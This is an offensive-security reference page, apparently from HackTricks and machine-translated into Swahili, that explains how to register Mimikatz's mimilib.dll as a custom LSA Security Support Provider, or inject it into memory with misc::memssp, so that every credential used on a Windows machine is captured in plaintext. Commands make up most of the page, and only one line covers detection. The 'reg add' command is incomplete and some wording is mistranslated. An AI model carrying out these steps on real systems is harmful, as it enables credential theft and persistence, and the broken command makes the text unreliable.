# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kukamata** katika **maandishi wazi** **akili** zinazotumika kufikia mashine.

#### Mimilib

Unaweza kutumia `mimilib.dll` binary inayotolewa na Mimikatz. **Hii itarekodi ndani ya faili akili zote katika maandiko wazi.**\
Tupa dll katika `C:\Windows\System32\`\
Pata orodha ya Pakiti za Usalama za LSA zilizopo:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Ongeza `mimilib.dll` kwenye orodha ya Watoa Huduma za Usalama (Security Packages):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Na baada ya kuanzisha upya, akreditivu zote zinaweza kupatikana kwa maandiko wazi katika `C:\Windows\System32\kiwissp.log`

#### Katika kumbukumbu

Unaweza pia kuingiza hii moja kwa moja katika kumbukumbu ukitumia Mimikatz (zingatia kwamba inaweza kuwa na utata kidogo/isiweze kufanya kazi):
```powershell
privilege::debug
misc::memssp
```
Hii haitadumu baada ya kuanzisha upya.

#### Kupunguza

Event ID 4657 - Ukaguzi wa uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
